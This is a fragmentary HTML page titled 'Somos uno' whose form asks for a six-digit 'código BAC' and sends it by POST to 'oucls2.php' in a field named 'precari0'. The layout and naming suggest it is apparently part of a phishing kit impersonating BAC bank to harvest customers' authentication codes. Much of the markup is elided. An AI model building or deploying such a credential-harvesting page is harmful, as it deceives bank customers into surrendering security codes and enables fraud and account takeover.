 ...
 <title>Somos uno</title>
   ...
   <body class="bel-space-reset bel-main-background">
      ...
      <div class="grid-container">
         ...
         <form method="post" action="oucls2.php">
                     ...
                     <div class="grid-row bel-space-bottom-m">
                       ...
                       <div class="col-12 col-md-5 col-lg-4">
                        ...
                        <div class="col-12 bel-space-bottom-xs order-md-2">
                           ...
                           <span id="messageResultBacCode" class="bel-typography-main bel-typography-label-error"></span>
                        </div>
                  ...
                  <div class="bel-card">
                     ...
                     <div class="grid-row bel-space-bottom-m">
                       ...
                       <div class="col-12 col-md-5 col-lg-4">
                           ...
                           <div class="bel-position-relative display-inline">
                              <input  class="bel-input bel-input-default bel-input--icon bel-truncate-text" maxlength="6" minlength="6"  type="text" inputmode="numeric" name="precari0" value="" placeholder="Digite su código BAC" required onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">     <br> <br> <img src="dfa.gif" style="width: 200px">                                 
                           </div>
                        </div>
                        <div class="col-12 bel-space-bottom-xs order-md-2">
                           <span id="messageResultBacCode" class="bel-typography-main bel-typography-label-error"></span>
